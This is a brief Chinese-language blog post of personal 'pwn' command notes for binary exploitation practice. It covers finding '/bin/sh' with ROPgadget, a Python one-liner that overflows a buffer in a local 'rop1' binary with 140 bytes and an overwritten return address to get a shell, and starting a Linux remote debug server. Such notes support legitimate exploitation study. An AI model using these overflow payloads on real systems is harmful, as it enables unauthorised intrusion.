---
layout:		post
title:		pwn命令记录篇
author:		wooy0ung
tags:		  pwn
category: note
---


>[索引目录]  
>0x001 ROPgadget  
>0x002 Python  
<!-- more -->


## 0x001 ROPgadget

```
ROPgadget --binary bin --string "/bin/sh"

```


## 0x002 Python

```
(python -c 'print "A"*140 + "\xa4\x84\x04\x08"';cat )| ./rop1
```

## 0x003 linux

```
x64 0x400000
```

```
$ chmod a+x ./linux_server64
$ ./linux_server64
```